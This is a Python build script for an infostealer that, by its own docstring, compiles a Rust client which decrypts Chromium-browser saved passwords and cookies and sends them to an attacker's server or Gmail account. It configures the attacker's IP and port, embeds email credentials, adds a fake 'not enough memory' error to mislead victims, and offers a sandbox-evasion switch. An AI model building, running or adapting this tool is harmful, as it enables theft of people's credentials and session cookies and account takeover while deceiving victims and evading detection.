# -*- coding: utf-8 -*-
"""Creates an Executable that decrypts and sends Chrome passwords and cookies

This script will make use of pyinstaller to create an executable
version of itself.
The executable's functionality is to decrypt Google Chrome
saved passwords and cookies, sending them as a json file to an attacker
through http connection.

Note: To include a custom icon, change the icon for the server or client in the icons directory"""
import stat
import configparser
import logging
import subprocess
import socket
import argparse
import random
import shutil
import os

from _modules import setup
config = configparser.ConfigParser()
config.read("config.ini")

template_dir = config["DIRECTORIES"]["TemplateDir"]
dist_dir = config["DIRECTORIES"]["DistDir"]
icon_dir = config["DIRECTORIES"]["IconDir"]
chromepass_base = config["DIRECTORIES"]["ChromePassBase"]
chromepass_server = config["DIRECTORIES"]["ChromePassServer"]
template_base = config["DIRECTORIES"]["ClientTemplateBase"]
log_dir = config["DIRECTORIES"]["LogDir"]
email_username = config["EMAIL"]["username"]
email_password = config["EMAIL"]["password"]
refresh_env = '$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User");'


def rmtree(top):
    for root, dirs, files in os.walk(top, topdown=False):
        for name in files:
            filename = os.path.join(root, name)
            os.chmod(filename, stat.S_IWRITE)
            os.remove(filename)
        for name in dirs:
            os.rmdir(os.path.join(root, name))
    os.rmdir(top)


def reset_folders():
    if not os.path.exists(dist_dir):
        os.mkdir(dist_dir)


def compile_client(build_command: str, src_path: str, dist_path: str, filename: str):
    try:
        build = subprocess.Popen(
            ["powershell.exe", build_command], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        for line in iter(build.stdout.readline, b''):
            line = line.decode(encoding="ISO-8859-1").strip()
            print(line)
            logging.debug(line)
        return copy_after_compilation(src_path, dist_path, filename)
    except Exception as e:
        print("[-] Error happened during compilation: {e}")
    return False


def stringify_bool(boolean):
    return str(boolean).lower()


def get_file_content(filename: str):
    return open(filename).read()


def write_file_content(filename: str, data: str):
    with open(filename, "w") as f:
        f.write(data)


def script_replace(temp_path: str, replacement_maps: dict, build_path: str, filenames: list):
    for filename, replacement_map in zip(filenames, replacement_maps):
        content = get_file_content(temp_path + filename)
        for key, val in replacement_map.items():
            content = content.replace(key, val)
        write_file_content(build_path + filename, content)


def copy_after_compilation(src_path, dist_path, filename):
    try:
        shutil.copyfile(src_path, dist_path)
        os.remove(src_path)
        print(f"[+] {filename} build was successful")
        return True
    except Exception as e:
        print(f"[-] {filename} couldn't be copied: {e}")
    return False


def copy_icon(src_path, dist_path, linux=False):
    if not linux:
        shutil.copyfile(src_path, dist_path)
    elif os.path.exists(dist_path):
        os.remove(dist_path)


def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", error_bool=False, error_message="None", cookies=False, login=False, port=80, nobuild=True, sandbox=False, email=False, username="", password=""):
    if nobuild:
        return True
    alphabet = "qwertyuiop[]asdfghjkl;'zxcvbnm,./"
    secret_key = ''.join(random.choice(alphabet) for _ in range(32))
    filenames = ["main.rs", "robber.rs", "browser.rs"]
    replacement_maps = [
        {
            "<<IP_ADDRESS>>": ip_address,
            "<<ERROR_BOOL>>": stringify_bool(error_bool),
            "<<ERROR_MESSAGE>>": error_message,
            "<<COOKIES_BOOL>>": stringify_bool(cookies),
            "<<LOGIN_BOOL>>": stringify_bool(login),
            "<<SANDBOX>>": stringify_bool(sandbox),
            "<<PORT>>": str(port),
            "<<SECRET_KEY>>": secret_key,
            "<<EMAIL_BOOL>>": stringify_bool(email),
            "<<USER_NAME>>": username,
            "<<PASSWORD>>": password,
        },
        {
            "<<SECRET_KEY>>": secret_key
        },
        {
            "<<SECRET_KEY>>": secret_key
        },
    ]

    temp_path = f"{template_dir}/client/"
    build_path = f"{template_dir}/{chromepass_base}/src/"
    build_command = f"{refresh_env}cd {template_dir}\\{chromepass_base}; cargo build --release;"
    executable_name = "chromepass.exe"
    src_path = f"{template_dir}/{chromepass_base}/target/release/{executable_name}"
    dist_path = f"{dist_dir}/{filename}.exe"
    if os.path.exists(temp_path):
        print("[+] Building Client")
        copy_icon(f"{icon_dir}/{icon}",
                  f"{template_dir}/{chromepass_base}/client.ico")
        script_replace(temp_path, replacement_maps, build_path, filenames)
        return compile_client(build_command, src_path, dist_path, "Client")
    print(f"[-] Error, file not found: {temp_path}")
    return False


def build_server(filename="server", icon="server.ico", port=80, nobuild=True, linux=False):
    if nobuild:
        return True
    replacement_maps = [{
        "<<PORT>>": str(port)
    }]
    filenames = ["main.rs"]
    temp_path = f"{template_dir}/server/"
    build_path = f"{template_dir}/{chromepass_server}/src/"
    script_replace(temp_path, replacement_maps, build_path, filenames)
    build_command = f"{refresh_env}cd {template_dir}\\{chromepass_server}; cargo build --release;"
    executable_name = "release/chromepass-server.exe"
    dist_path = f"{dist_dir}/{filename}.exe"
    if linux:
        nightly = f"{refresh_env}rustup default nightly"
        musl_target = f"{refresh_env}rustup target add x86_64-unknown-linux-musl"
        build_command = f"{refresh_env}cd {template_dir}\\{chromepass_server};{nightly};{musl_target};cargo build --release --target x86_64-unknown-linux-musl"
        executable_name = "x86_64-unknown-linux-musl/release/chromepass-server"
        dist_path = f"{dist_dir}/{filename}"
    src_path = f"{template_dir}/{chromepass_server}/target/{executable_name}"
    if os.path.exists(temp_path):
        print("[+] Building Server")
        icon_path = f"{template_dir}/{chromepass_server}/server.ico"
        copy_icon(f"{icon_dir}/{icon}", icon_path, linux)
        return compile_client(build_command, src_path, dist_path, "Server")
    print(f"[-] Error, file not found: {temp_path}")
    return False


def build_message(server, client):
    if not server:
        print(f"[-] Error building the server")
    if not client:
        print(f"[-] Error building the client")
    if server and client:
        os.system("cls")
        print(
            f"[+] Build was successful. The file(s) should be in the directory: {dist_dir}")
    reset_folders()


def check_valid_port(port):
    try:
        port = int(port)
        if 0 < port < 65535:
            return port
        raise argparse.ArgumentTypeError(
            f"Port {port} is invalid. Please use numbers between 1 and 65534")
    except ValueError:
        raise ValueError(f"Port needs to be an integer")


def set_arguments(parser: argparse.ArgumentParser, error_message: str):
    parser.add_argument('--ip', metavar="IP", type=str, default="127.0.0.1",
                        help="IP address to connect to, or reverse dns. Default is 127.0.0.1")
    parser.add_argument('--port', metavar="PORT", type=check_valid_port, default=80,
                        help="Port to host the server, deafult is 80")
    parser.add_argument('--error', dest="error_bool",
                        action="store_true", default=False, help="Use this to enable the error message. Default is False")
    parser.add_argument('--message', metavar="Error Message",
                        type=str, help="Use to set the error message. The default is low memory error.", default=error_message)
    parser.add_argument('--username', metavar="Gmail account",
                        type=str, help="Gmail account to use if email enabled. If not supplied, default comes from config file.", default=email_username)
    parser.add_argument('--password', metavar="Gmail app password",
                        type=str, help="App password to access gmail account. Not your normal password. If not supplied, default comes from config file.", default=email_password)
    parser.add_argument('--email', dest="email_bool",
                        action="store_true", default=False, help="Use email instead of http server. By default this is false.")
    parser.add_argument('--nocookies', dest="cookies_bool",
                        action="store_false", default=True, help="Use to not capture cookies. Default is capturing cookies and credentials")
    parser.add_argument('--nologin', dest="login_bool",
                        action="store_false", default=True, help="Use to not capture credentials. Default is capturing cookies and credentials")
    parser.add_argument('--noserver', dest="noserver",
                        action="store_true", default=False, help="Doesn't build the server")
    parser.add_argument('--noclient', dest="noclient",
                        action="store_true", default=False, help="Doesn't build the client")
    parser.add_argument('--linux', dest="linux",
                        action="store_true", default=False, help="Builds the server for linux")
    parser.add_argument('--sandbox', dest="sandbox",
                        action="store_true", default=False, help="Helps evade some sandbox environments. Requires internet access, otherwise it fails. This may increase AV detection")
    return parser


def parse_arguments():
    error_message = "There isn't enough memory to complete this action. Try using less data or closing other applications."
    parser = argparse.ArgumentParser(
        description='Creates a server and client to steal credentials and cookies from Chromium-based browsers: (Chrome, Chromium, Edge, Brave, etc...)')
    parser = set_arguments(parser, error_message)
    args = parser.parse_args()
    try:
        socket.gethostbyname(args.ip)
    except:
        print("The ip address is wrong, please try again")
        return False

    reset_folders()
    if not args.email_bool:
        server = build_server(
            port=args.port, nobuild=args.noserver, linux=args.linux)
    else:
        server = True
    client = build_client(ip_address=args.ip, error_bool=args.error_bool, error_message=args.message,
                          cookies=args.cookies_bool, login=args.login_bool, port=args.port, nobuild=args.noclient, sandbox=args.sandbox, email=args.email_bool, username=args.username, password=args.password)
    build_message(server, client)


if __name__ == "__main__":
    parse_arguments()
